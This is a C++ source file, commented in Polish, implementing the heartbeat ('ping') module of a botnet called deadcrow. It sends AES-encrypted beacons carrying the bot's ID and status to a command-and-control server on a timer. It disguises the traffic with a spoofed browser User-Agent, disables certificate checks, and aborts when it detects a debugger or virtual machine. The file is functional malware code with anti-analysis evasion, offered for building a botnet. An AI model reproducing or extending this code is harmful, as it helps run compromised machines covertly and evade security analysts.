#include "ping.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <random>
#include <mutex>

using json = nlohmann::json;

namespace deadcrow {
namespace botnet {

// Callback dla libcurl do zapisywania danych
size_t PingWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    std::string* response = static_cast<std::string*>(userp);
    response->append(static_cast<char*>(contents), realsize);
    return realsize;
}

Ping::Ping(const std::string& c2_url, const std::string& aes_key, const std::string& bot_id)
    : c2_url_(c2_url), aes_key_(aes_key), bot_id_(bot_id), active_(false) {
    
    // Inicjalizacja libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[PING] " << status << std::endl;
        #endif
    };
}

Ping::~Ping() {
    stop();
    curl_global_cleanup();
}

bool Ping::start(int interval_seconds) {
    if (active_) {
        reportStatus("Ping już jest aktywny");
        return false;
    }
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Sprawdź, czy mamy wszystkie potrzebne dane
    if (c2_url_.empty() || aes_key_.empty() || bot_id_.empty()) {
        reportStatus("Brak wymaganych danych (URL C2, klucz AES lub ID bota)");
        return false;
    }
    
    // Ustaw flagę aktywności
    active_ = true;
    
    // Utwórz wątek pingowania
    ping_thread_ = std::make_unique<std::thread>(&Ping::pingLoop, this, interval_seconds);
    
    reportStatus("Ping uruchomiony z interwałem " + std::to_string(interval_seconds) + " sekund");
    return true;
}

void Ping::stop() {
    if (!active_) {
        return;
    }
    
    // Ustaw flagę aktywności na false
    active_ = false;
    
    // Poczekaj na zakończenie wątku
    if (ping_thread_ && ping_thread_->joinable()) {
        ping_thread_->join();
        ping_thread_.reset();
    }
    
    reportStatus("Ping zatrzymany");
}

bool Ping::sendPing() {
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Przygotuj dane do wysłania
    json data;
    data["bot_id"] = bot_id_;
    data["timestamp"] = std::chrono::system_clock::now().time_since_epoch().count();
    data["status"] = "alive";
    
    // Dodaj dodatkowe dane
    for (const auto& pair : additional_data_) {
        data[pair.first] = pair.second;
    }
    
    // Dodaj losowy identyfikator żądania, aby uniknąć cachowania
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 1000000);
    data["request_id"] = dis(gen);
    
    // Wyślij żądanie do C2
    std::string response = sendRequest("ping", data.dump());
    
    // Parsuj odpowiedź
    if (!response.empty()) {
        return parseResponse(response);
    }
    
    return false;
}

void Ping::pingLoop(int interval_seconds) {
    while (active_) {
        // Wykonaj ping
        bool success = sendPing();
        
        if (!success) {
            reportStatus("Ping nie powiódł się");
        }
        
        // Czekaj określony czas, ale sprawdzaj flagę aktywności co sekundę
        for (int i = 0; i < interval_seconds && active_; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}

std::string Ping::sendRequest(const std::string& endpoint, const std::string& data) {
    try {
        // Szyfruj dane
        utils::AES aes(aes_key_);
        std::string encrypted_data = aes.encryptToBase64(data);
        
        // Przygotuj URL
        std::string url = c2_url_;
        if (url.back() != '/') {
            url += '/';
        }
        url += endpoint;
        
        // Inicjalizuj sesję CURL
        CURL* curl = curl_easy_init();
        if (!curl) {
            reportStatus("Nie udało się zainicjalizować libcurl");
            return "";
        }
        
        // Przygotuj odpowiedź
        std::string response;
        
        // Przygotuj nagłówki
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        
        // Przygotuj dane POST
        json post_data;
        post_data["data"] = encrypted_data;
        std::string post_fields = post_data.dump();
        
        // Konfiguracja żądania
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, PingWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
        
        // Wykonaj żądanie
        CURLcode res = curl_easy_perform(curl);
        
        // Zwolnij zasoby
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        if (res != CURLE_OK) {
            reportStatus("Błąd podczas wysyłania żądania: " + std::string(curl_easy_strerror(res)));
            return "";
        }
        
        return response;
    }
    catch (const std::exception& e) {
        reportStatus("Wyjątek podczas wysyłania żądania: " + std::string(e.what()));
        return "";
    }
}

bool Ping::parseResponse(const std::string& response) {
    try {
        // Deszyfruj odpowiedź
        utils::AES aes(aes_key_);
        
        // Parsuj JSON
        json response_json = json::parse(response);
        
        // Sprawdź, czy odpowiedź zawiera zaszyfrowane dane
        if (!response_json.contains("data")) {
            reportStatus("Odpowiedź nie zawiera danych");
            return false;
        }
        
        // Deszyfruj dane
        std::string encrypted_data = response_json["data"];
        std::string decrypted_data = aes.decryptFromBase64(encrypted_data);
        
        // Parsuj odszyfrowane dane
        json result = json::parse(decrypted_data);
        
        // Sprawdź status
        if (result.contains("status") && result["status"] == "success") {
            reportStatus("Ping zakończony pomyślnie");
            return true;
        } else {
            reportStatus("Błąd podczas pingowania: " + result.value("message", "Nieznany błąd"));
            return false;
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas parsowania odpowiedzi: " + std::string(e.what()));
        return false;
    }
}

void Ping::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

bool Ping::isActive() const {
    return active_;
}

void Ping::setAdditionalData(const std::string& key, const std::string& value) {
    additional_data_[key] = value;
}

void Ping::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool Ping::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

} // namespace botnet
} // namespace deadcrow
